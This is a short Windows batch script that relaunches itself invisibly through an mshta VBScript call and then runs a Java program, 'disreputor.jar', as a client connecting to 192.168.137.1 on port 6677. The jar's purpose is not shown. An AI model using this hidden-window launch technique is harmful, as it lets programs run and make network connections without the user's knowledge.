@echo off 
if "%1"=="h" goto begin 
start mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit 
:begin
java -jar disreputor.jar -c 192.168.137.1 6677 >client.log
